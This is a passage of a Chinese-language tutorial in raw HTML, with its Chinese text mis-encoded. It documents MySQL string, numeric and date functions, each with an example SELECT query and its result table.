class="line">+-------------------+</span><br><span class="line">| REPEAT(&#39;MySQL&#39;,3) |</span><br><span class="line">+-------------------+</span><br><span class="line">| MySQLMySQLMySQL   |</span><br><span class="line">+-------------------+</span><br></pre></td></tr></table></figure><p><strong>20.REPLACE(s,s1,s2)</strong></p><p>å°†å­—ç¬¦ä¸² s2 æ›¿ä»£å­—ç¬¦ä¸² s ä¸­çš„å­—ç¬¦ä¸² s1</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT REPLACE (&#39;MySQL&#39;,&#39;My&#39;,&#39;Your&#39;);</span><br><span class="line">+-------------------------------+</span><br><span class="line">| REPLACE (&#39;MySQL&#39;,&#39;My&#39;,&#39;Your&#39;) |</span><br><span class="line">+-------------------------------+</span><br><span class="line">| YourSQL                       |</span><br><span class="line">+-------------------------------+</span><br></pre></td></tr></table></figure><p><strong>21.REVERSE(s)</strong></p><p>å°†å­—ç¬¦ä¸²sçš„é¡ºåºåè¿‡æ¥</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT REVERSE (&#39;MySQL&#39;);</span><br><span class="line">+-------------------+</span><br><span class="line">| REVERSE (&#39;MySQL&#39;) |</span><br><span class="line">+-------------------+</span><br><span class="line">| LQSyM             |</span><br><span class="line">+-------------------+</span><br></pre></td></tr></table></figure><p><strong>22.SPACE (s)</strong></p><p>è¿”å›nä¸ªç©ºæ ¼</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT SPACE (10);</span><br><span class="line">+------------+</span><br><span class="line">| SPACE (10) |</span><br><span class="line">+------------+</span><br><span class="line">|            |</span><br><span class="line">+------------+</span><br></pre></td></tr></table></figure><p><strong>23.STRCMP(s1,s2)</strong></p><p>æ¯”è¾ƒå­—ç¬¦ä¸² s1 å’Œ s2ï¼Œå¦‚æœ s1 ä¸ s2 ç›¸ç­‰è¿”å› 0 ï¼Œå¦‚æœ s1&gt;s2 è¿”å› 1ï¼Œå¦‚æœ s1&lt;s2 è¿”å› -1</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT STRCMP (&#39;MySQL&#39;,&#39;MySQL&#39;);</span><br><span class="line">+--------------------------+</span><br><span class="line">| STRCMP (&#39;MySQL&#39;,&#39;MySQL&#39;) |</span><br><span class="line">+--------------------------+</span><br><span class="line">|                        0 |</span><br><span class="line">+--------------------------+</span><br></pre></td></tr></table></figure><p><strong>24.SUBSTRING_INDEX(s, delimiter, number)</strong></p><p>è¿”å›ä»å­—ç¬¦ä¸² s çš„ç¬¬ number ä¸ªå‡ºç°çš„åˆ†éš”ç¬¦ delimiter ä¹‹åçš„å­ä¸²ã€‚<br>å¦‚æœ number æ˜¯æ­£æ•°ï¼Œè¿”å›ç¬¬ number ä¸ªå­—ç¬¦å·¦è¾¹çš„å­—ç¬¦ä¸²ã€‚<br>å¦‚æœ number æ˜¯è´Ÿæ•°ï¼Œè¿”å›ç¬¬(number çš„ç»å¯¹å€¼(ä»å³è¾¹æ•°))ä¸ªå­—ç¬¦å³è¾¹çš„å­—ç¬¦ä¸²ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">SELECT SUBSTRING_INDEX(&#39;M*y*S*Q*L&#39;,&#39;*&#39;,2);</span><br><span class="line">+------------------------------------+</span><br><span class="line">| SUBSTRING_INDEX(&#39;M*y*S*Q*L&#39;,&#39;*&#39;,2) |</span><br><span class="line">+------------------------------------+</span><br><span class="line">| M*y                                |</span><br><span class="line">+------------------------------------+</span><br><span class="line"> SELECT SUBSTRING_INDEX(&#39;M*y*S*Q*L&#39;,&#39;*&#39;,-3);</span><br><span class="line">+-------------------------------------+</span><br><span class="line">| SUBSTRING_INDEX(&#39;M*y*S*Q*L&#39;,&#39;*&#39;,-3) |</span><br><span class="line">+-------------------------------------+</span><br><span class="line">| S*Q*L                               |</span><br><span class="line">+-------------------------------------+</span><br><span class="line">SELECT SUBSTRING_INDEX(SUBSTRING_INDEX(&#39;M*y*S*Q*L&#39;,&#39;*&#39;,-3),&#39;*&#39;,2);</span><br><span class="line">+------------------------------------------------------------+</span><br><span class="line">| SUBSTRING_INDEX(SUBSTRING_INDEX(&#39;M*y*S*Q*L&#39;,&#39;*&#39;,-3),&#39;*&#39;,2) |</span><br><span class="line">+------------------------------------------------------------+</span><br><span class="line">| S*Q                                                        |</span><br><span class="line">+------------------------------------------------------------+</span><br></pre></td></tr></table></figure><h2 id="MySQL-æ•°å­—å‡½æ•°"><a href="#MySQL-æ•°å­—å‡½æ•°" class="headerlink" title="MySQL æ•°å­—å‡½æ•°"></a>MySQL æ•°å­—å‡½æ•°</h2><p><strong>1.ABS(x)</strong></p><p> è¿”å› x çš„ç»å¯¹å€¼</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT ABS(-1);</span><br><span class="line">+---------+</span><br><span class="line">| ABS(-1) |</span><br><span class="line">+---------+</span><br><span class="line">|       1 |</span><br><span class="line">+---------+</span><br></pre></td></tr></table></figure><p><strong>2.AVG(expression)</strong></p><p>è¿”å›ä¸€ä¸ªè¡¨è¾¾å¼çš„å¹³å‡å€¼ï¼Œexpression æ˜¯ä¸€ä¸ªå­—æ®µ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT AVG(Price) AS AveragePrice FROM Products;</span><br><span class="line">+--------------+</span><br><span class="line">| AveragePrice |</span><br><span class="line">+--------------+</span><br><span class="line">|     456.0000 |</span><br><span class="line">+--------------+</span><br></pre></td></tr></table></figure><p><strong>3.ä¸‰è§’å‡½æ•°(å‚æ•°xæ˜¯å¼§åº¦)</strong></p><p>SIN(x) | COS(x) | TAN(x) | COT(x) | ASIN(x) | ACOS(x) | ATAN(x) </p><p><strong>4.DEGREES(x)</strong></p><p>å°†å¼§åº¦è½¬æ¢ä¸ºè§’åº¦ã€€ã€€</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT DEGREES(3.1415926535898) ;</span><br><span class="line">+--------------------------+</span><br><span class="line">| DEGREES(3.1415926535898) |</span><br><span class="line">+--------------------------+</span><br><span class="line">|        180.0000000000004 |</span><br><span class="line">+--------------------------+</span><br></pre></td></tr></table></figure><p><strong>5.CEIL(x)</strong></p><p>è¿”å›å¤§äºæˆ–ç­‰äº x çš„æœ€å°æ•´æ•°ã€€</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> SELECT CEIL (0.1);</span><br><span class="line">+------------+</span><br><span class="line">| CEIL (0.1) |</span><br><span class="line">+------------+</span><br><span class="line">|          1 |</span><br><span class="line">+------------+</span><br></pre></td></tr></table></figure><p><strong>6.FLOOR(x)</strong></p><p>è¿”å›å°äºæˆ–ç­‰äº x çš„æœ€å¤§æ•´æ•°ã€€ã€€</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> SELECT FLOOR(-0.1);</span><br><span class="line">+-------------+</span><br><span class="line">| FLOOR(-0.1) |</span><br><span class="line">+-------------+</span><br><span class="line">|          -1 |</span><br><span class="line">+-------------+</span><br></pre></td></tr></table></figure><p><strong>7.COUNT(expression)</strong></p><p>è¿”å›æŸ¥è¯¢çš„è®°å½•æ€»æ•°ï¼Œexpression å‚æ•°æ˜¯ä¸€ä¸ªå­—æ®µæˆ–è€… * å·</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT COUNT(User) AS User_number FROM user;</span><br><span class="line">+-------------+</span><br><span class="line">| User_number |</span><br><span class="line">+-------------+</span><br><span class="line">|           6 |</span><br><span class="line">+-------------+</span><br></pre></td></tr></table></figure><p><strong>8.n DIV m</strong></p><p>æ•´é™¤ï¼Œn ä¸ºè¢«é™¤æ•°ï¼Œm ä¸ºé™¤æ•°</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT 10 DIV 5;</span><br><span class="line">+----------+</span><br><span class="line">| 10 DIV 5 |</span><br><span class="line">+----------+</span><br><span class="line">|        2 |</span><br><span class="line">+----------+</span><br></pre></td></tr></table></figure><p><strong>9.MOD(x,y)</strong></p><p>è¿”å› x é™¤ä»¥ y ä»¥åçš„ä½™æ•°</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT MOD(5,2);</span><br><span class="line">+----------+</span><br><span class="line">| MOD(5,2) |</span><br><span class="line">+----------+</span><br><span class="line">|        1 |</span><br><span class="line">+----------+</span><br></pre></td></tr></table></figure><p><strong>10.EXP(x)</strong></p><p>è¿”å› e çš„ x æ¬¡æ–¹ã€€ã€€</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT EXP(3) ;</span><br><span class="line">+--------------------+</span><br><span class="line">| EXP(3)             |</span><br><span class="line">+--------------------+</span><br><span class="line">| 20.085536923187668 |</span><br><span class="line">+--------------------+</span><br></pre></td></tr></table></figure><p><strong>11.GREATEST(expr1, expr2, expr3, â€¦)</strong></p><p>è¿”å›åˆ—è¡¨ä¸­çš„æœ€å¤§å€¼</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"> SELECT GREATEST(3, 12, 34, 8, 25);</span><br><span class="line">+----------------------------+</span><br><span class="line">| GREATEST(3, 12, 34, 8, 25) |</span><br><span class="line">+----------------------------+</span><br><span class="line">|                         34 |</span><br><span class="line">+----------------------------+</span><br><span class="line">SELECT GREATEST(&#39;MySQL&#39;,&#39;Oracle&#39;,&#39;MariaDB&#39;);</span><br><span class="line">+--------------------------------------+</span><br><span class="line">| GREATEST(&#39;MySQL&#39;,&#39;Oracle&#39;,&#39;MariaDB&#39;) |</span><br><span class="line">+--------------------------------------+</span><br><span class="line">| Oracle                               |</span><br><span class="line">+--------------------------------------+</span><br></pre></td></tr></table></figure><p><strong>12.LEAST(expr1, expr2, expr3, â€¦)</strong></p><p>è¿”å›åˆ—è¡¨ä¸­çš„æœ€å°å€¼</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT LEAST(3, 12, 34, 8, 25);</span><br><span class="line">+-------------------------+</span><br><span class="line">| LEAST(3, 12, 34, 8, 25) |</span><br><span class="line">+-------------------------+</span><br><span class="line">|                       3 |</span><br><span class="line">+-------------------------+</span><br></pre></td></tr></table></figure><p><strong>13.MAX(expression)</strong></p><p>è¿”å›å­—æ®µ expression ä¸­çš„æœ€å¤§å€¼</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT MAX(Price) AS LargestPrice FROM Products;</span><br><span class="line">+--------------+</span><br><span class="line">| LargestPrice |</span><br><span class="line">+--------------+</span><br><span class="line">|          789 |</span><br><span class="line">+--------------+</span><br></pre></td></tr></table></figure><p><strong>14.MIN(expression)</strong></p><p>è¿”å›å­—æ®µ expression ä¸­çš„æœ€å°å€¼</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> SELECT MIN(Price) AS MinPrice FROM Products;</span><br><span class="line">+----------+</span><br><span class="line">| MinPrice |</span><br><span class="line">+----------+</span><br><span class="line">|      123 |</span><br><span class="line">+----------+</span><br></pre></td></tr></table></figure><p><strong>15.å¯¹æ•°è®¡ç®—</strong></p><p>LOG(x)  è¿”å›æ•°å­—çš„è‡ªç„¶å¯¹æ•°ï¼Œä»¥ e ä¸ºåº•ã€‚</p><p>LOG(n, x)  è¿”å›ä»¥nä¸ºåº•ï¼Œæ•°å­—xçš„å¯¹æ•°ã€‚</p><p>LOG2(x)  è¿”å›ä»¥ 2 ä¸ºåº•çš„å¯¹æ•°ã€‚</p><p>LOG10(x)   è¿”å›ä»¥ 10 ä¸ºåº•çš„å¯¹æ•°ã€‚</p><p><strong>16.PI()</strong></p><p>è¿”å›åœ†å‘¨ç‡(3.141593ï¼‰</p><p><strong>17.POW(x,y)  | POWER(x,y)</strong></p><p>è¿”å› x çš„ y æ¬¡æ–¹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">SELECT POW (2,3);</span><br><span class="line">+-----------+</span><br><span class="line">| POW (2,3) |</span><br><span class="line">+-----------+</span><br><span class="line">|         8 |</span><br><span class="line">+-----------+</span><br><span class="line">SELECT POWER(2,3);</span><br><span class="line">+------------+</span><br><span class="line">| POWER(2,3) |</span><br><span class="line">+------------+</span><br><span class="line">|          8 |</span><br><span class="line">+------------+</span><br></pre></td></tr></table></figure><p><strong>18.RADIANS(x)</strong></p><p>å°†è§’åº¦è½¬æ¢ä¸ºå¼§åº¦ã€€</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> SELECT RADIANS(180);</span><br><span class="line">+-------------------+</span><br><span class="line">| RADIANS(180)      |</span><br><span class="line">+-------------------+</span><br><span class="line">| 3.141592653589793 |</span><br><span class="line">+-------------------+</span><br></pre></td></tr></table></figure><p><strong>19.RAND()</strong></p><p>è¿”å› 0 åˆ° 1 çš„éšæœºæ•°ã€€</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT RAND();</span><br><span class="line">+--------------------+</span><br><span class="line">| RAND()             |</span><br><span class="line">+--------------------+</span><br><span class="line">| 0.8029554586885083 |</span><br><span class="line">+--------------------+</span><br></pre></td></tr></table></figure><p><strong>20.ROUND(x)</strong></p><p>è¿”å›ç¦» x æœ€è¿‘çš„æ•´æ•°</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"> SELECT ROUND(1.49999999999);</span><br><span class="line">+----------------------+</span><br><span class="line">| ROUND(1.49999999999) |</span><br><span class="line">+----------------------+</span><br><span class="line">|                    1 |</span><br><span class="line">+----------------------+</span><br><span class="line">SELECT ROUND(1.5);</span><br><span class="line">+------------+</span><br><span class="line">| ROUND(1.5) |</span><br><span class="line">+------------+</span><br><span class="line">|          2 |</span><br><span class="line">+------------+</span><br></pre></td></tr></table></figure><p><strong>21.SIGN(x)</strong></p><p>è¿”å› x çš„ç¬¦å·ï¼Œx æ˜¯è´Ÿæ•°ã€0ã€æ­£æ•°åˆ†åˆ«è¿”å› -1ã€0 å’Œ 1ã€€</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT SIGN(-1);</span><br><span class="line">+----------+</span><br><span class="line">| SIGN(-1) |</span><br><span class="line">+----------+</span><br><span class="line">|       -1 |</span><br><span class="line">+----------+</span><br></pre></td></tr></table></figure><p><strong>22.SQRT(x)</strong></p><p>è¿”å›xçš„å¹³æ–¹æ ¹ã€€</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT SQRT(4);</span><br><span class="line">+---------+</span><br><span class="line">| SQRT(4) |</span><br><span class="line">+---------+</span><br><span class="line">|       2 |</span><br><span class="line">+---------+</span><br></pre></td></tr></table></figure><p><strong>23.SUM(expression)</strong></p><p>è¿”å›æŒ‡å®šå­—æ®µçš„æ€»å’Œ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT SUM(Price) FROM Products;</span><br><span class="line">+------------+</span><br><span class="line">| SUM(Price) |</span><br><span class="line">+------------+</span><br><span class="line">|       1368 |</span><br><span class="line">+------------+</span><br></pre></td></tr></table></figure><p><strong>24.TRUNCATE(x,y)</strong></p><p>è¿”å›æ•°å€¼ x ä¿ç•™åˆ°å°æ•°ç‚¹å y ä½çš„å€¼ï¼ˆä¸ ROUND æœ€å¤§çš„åŒºåˆ«æ˜¯ä¸ä¼šè¿›è¡Œå››èˆäº”å…¥ï¼‰</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT TRUNCATE(1.23456,3);</span><br><span class="line">+---------------------+</span><br><span class="line">| TRUNCATE(1.23456,3) |</span><br><span class="line">+---------------------+</span><br><span class="line">|               1.234 |</span><br><span class="line">+---------------------+</span><br></pre></td></tr></table></figure><h2 id="MySQL-æ—¥æœŸå‡½æ•°"><a href="#MySQL-æ—¥æœŸå‡½æ•°" class="headerlink" title="MySQL æ—¥æœŸå‡½æ•°"></a>MySQL æ—¥æœŸå‡½æ•°</h2><p><strong>1.ADDDATE(d,n)</strong></p><p> è®¡ç®—èµ·å§‹æ—¥æœŸ d åŠ ä¸Š n å¤©çš„æ—¥æœŸ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT ADDDATE(&#39;2020-2-1&#39;,30);</span><br><span class="line">+------------------------+</span><br><span class="line">| ADDDATE(&#39;2020-2-1&#39;,30) |</span><br><span class="line">+------------------------+</span><br><span class="line">| 2020-03-02             |</span><br><span class="line">+------------------------+</span><br></pre></td></tr></table></figure><p><strong>2.ADDTIME(t,n)</strong></p><p>n æ˜¯ä¸€ä¸ªæ—¶é—´è¡¨è¾¾å¼ï¼Œæ—¶é—´ t åŠ ä¸Šæ—¶é—´è¡¨è¾¾å¼ n</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT ADDTIME(&#39;2020-11-10 20:00:00&#39;,&#39;4:0:0&#39;);</span><br><span class="line">+----------------------------------------+</span><br><span class="line">| ADDTIME(&#39;2020-11-10 20:00:00&#39;,&#39;4:0:0&#39;) |</span><br><span class="line">+----------------------------------------+</span><br><span class="line">| 2020-11-11 00:00:00                    |</span><br><span class="line">+----------------------------------------+</span><br></pre></td></tr></table></figure><p><strong>3.DATE_ADD(dï¼ŒINTERVAL expr type)</strong></p><p>è®¡ç®—èµ·å§‹æ—¥æœŸ d åŠ ä¸Šä¸€ä¸ªæ—¶é—´æ®µåçš„æ—¥æœŸ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT DATE_ADD(&#39;2020-11-11 11:11:11&#39; ,INTERVAL 5 MINUTE);</span><br><span class="line">+----------------------------------------------------+</span><br><span class="line">| DATE_ADD(&#39;2020-11-11 11:11:11&#39; ,INTERVAL 5 MINUTE) |</span><br><span class="line">+----------------------------------------------------+</span><br><span class="line">| 2020-11-11 11:16:11                                |</span><br><span class="line">+----------------------------------------------------+</span><br></pre></td></tr></table></figure><p><strong>4.å½“å‰æ—¥æœŸæ—¶é—´</strong></p><p>CURDATE()  |   CURRENT_DATE()   è¿”å›å½“å‰æ—¥æœŸ</p><p>CURTIME()  |    CURRENT_TIME     è¿”å›å½“å‰æ—¶é—´</p><p>NOW()  |  CURRENT_TIMESTAMP()  |  LOCALTIME()  |LOCALTIMESTAMP()   |  SYSDATE()  è¿”å›å½“å‰æ—¥æœŸå’Œæ—¶é—´</p><p><strong>5.DATE(t)  |  HOUR(t)  |  MINUTE(t)  |SECOND(t)</strong></p><p>ä»æ—¥æœŸæˆ–æ—¥æœŸæ—¶é—´è¡¨è¾¾å¼ä¸­æå–æ—¥æœŸå€¼|å°æ—¶å€¼|åˆ†é’Ÿå€¼|ç§’é’Ÿå€¼</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT DATE(&#39;2020-11-11 0:0:0&#39;);</span><br><span class="line">+--------------------------+</span><br><span class="line">| DATE(&#39;2020-11-11 0:0:0&#39;) |</span><br><span class="line">+--------------------------+</span><br><span class="line">| 2020-11-11               |</span><br><span class="line">+--------------------------+</span><br></pre></td></tr></table></figure><p><strong>6.DATEDIFF(d1,d2)</strong></p><p>è®¡ç®—æ—¥æœŸ d1-&gt;d2 ä¹‹é—´ç›¸éš”çš„å¤©æ•°</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> SELECT DATEDIFF(&#39;2020-11-22&#39;,&#39;2021-6-7&#39;);</span><br><span class="line">+-----------------------------------+</span><br><span class="line">| DATEDIFF(&#39;2020-11-22&#39;,&#39;2021-6-7&#39;) |</span><br><span class="line">+-----------------------------------+</span><br><span class="line">|                              -197 |</span><br><span class="line">+-----------------------------------+</span><br></pre></td></tr></table></figure><p><strong>7.DATE_FORMAT(d,f)</strong></p><p> æŒ‰è¡¨è¾¾å¼ fçš„è¦æ±‚æ˜¾ç¤ºæ—¥æœŸ d</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> SELECT DATE_FORMAT(&#39;2011-11-11 11:11:11&#39;,&#39;%Y-%m-%d %r&#39;);</span><br><span class="line">+--------------------------------------------------+</span><br><span class="line">| DATE_FORMAT(&#39;2011-11-11 11:11:11&#39;,&#39;%Y-%m-%d %r&#39;) |</span><br><span class="line">+--------------------------------------------------+</span><br><span class="line">| 2011-11-11 11:11:11 AM                           |</span><br><span class="line">+--------------------------------------------------+</span><br></pre></td></tr></table></figure><p><strong>8.DATE_SUB(date,INTERVAL expr type)</strong></p><p>å‡½æ•°ä»æ—¥æœŸå‡å»æŒ‡å®šçš„æ—¶é—´é—´éš”ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"> select * from Orders;</span><br><span class="line">+---------+------------+</span><br><span class="line">| OrderId | OrderDate  |</span><br><span class="line">+---------+------------+</span><br><span class="line">|       1 | 2020-11-11 |</span><br><span class="line">+---------+------------+</span><br><span class="line">SELECT OrderId,DATE_SUB(OrderDate,INTERVAL 2 DAY) AS OrderPayDate FROM Orders;</span><br><span class="line">+---------+--------------+</span><br><span class="line">| OrderId | OrderPayDate |</span><br><span class="line">+---------+--------------+</span><br><span class="line">|       1 | 2020-11-09   |</span><br><span class="line">+---------+--------------+</span><br></pre></td></tr></table></figure><p><strong>9.DAY(d)</strong></p><p>è¿”å›æ—¥æœŸå€¼ d çš„æ—¥æœŸéƒ¨åˆ†</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT DAY(&#39;2020-11-11&#39;) AS day;</span><br><span class="line">+------+</span><br><span class="line">| day  |</span><br><span class="line">+------+</span><br><span class="line">|   11 |</span><br><span class="line">+------+</span><br></pre></td></tr></table></figure><p><strong>10.DAYNAME(d)</strong></p><p>è¿”å›æ—¥æœŸ d æ˜¯æ˜ŸæœŸå‡ ï¼Œå¦‚ Monday,Tuesday</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> SELECT DAYNAME(&#39;2020-11-11&#39;);</span><br><span class="line">+-----------------------+</span><br><span class="line">| DAYNAME(&#39;2020-11-11&#39;) |</span><br><span class="line">+-----------------------+</span><br><span class="line">| Wednesday             |</span><br><span class="line">+-----------------------+</span><br></pre></td></tr></table></figure><p><strong>11.DAYOFYEAR(d)</strong></p><p> è®¡ç®—æ—¥æœŸ d æ˜¯æœ¬å¹´çš„ç¬¬å‡ å¤©</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> SELECT DAYOFYEAR (&#39;2020-11-11&#39;);</span><br><span class="line">+--------------------------+</span><br><span class="line">| DAYOFYEAR (&#39;2020-11-11&#39;) |</span><br><span class="line">+--------------------------+</span><br><span class="line">|                      316 |</span><br><span class="line">+--------------------------+</span><br></pre></td></tr></table></figure><p><strong>12.EXTRACT(type FROM d)</strong></p><p>ä»æ—¥æœŸ d ä¸­è·å–æŒ‡å®šçš„å€¼ï¼Œtype 